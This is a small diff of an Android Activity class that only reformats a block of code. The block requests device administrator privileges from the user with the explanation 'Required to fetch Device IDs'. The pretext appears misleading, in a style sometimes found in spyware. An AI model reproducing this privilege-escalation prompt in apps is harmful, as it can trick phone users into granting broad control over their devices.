@@ -132,8 +132,8 @@ public class AGUI extends Activity {
 				}
 				
 				try {
-					if(Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS))
-					{
+					
+					if (Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS)) {
 						Context context = Status.self().getAppContext();
 
 						Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
@@ -144,6 +144,7 @@ public class AGUI extends Activity {
 						intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
 
 						context.startActivity(intent);
+						
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
 						}
